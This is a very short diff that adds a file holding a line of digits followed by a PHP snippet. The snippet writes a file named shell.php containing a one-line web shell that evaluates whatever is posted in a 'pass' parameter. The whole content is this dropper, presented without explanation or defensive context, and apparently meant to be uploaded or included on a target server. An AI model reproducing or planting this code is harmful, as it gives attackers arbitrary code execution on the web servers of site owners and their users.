@@ -1,0 +1,2 @@
+1111111111111
+<?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[pass])?>');?>
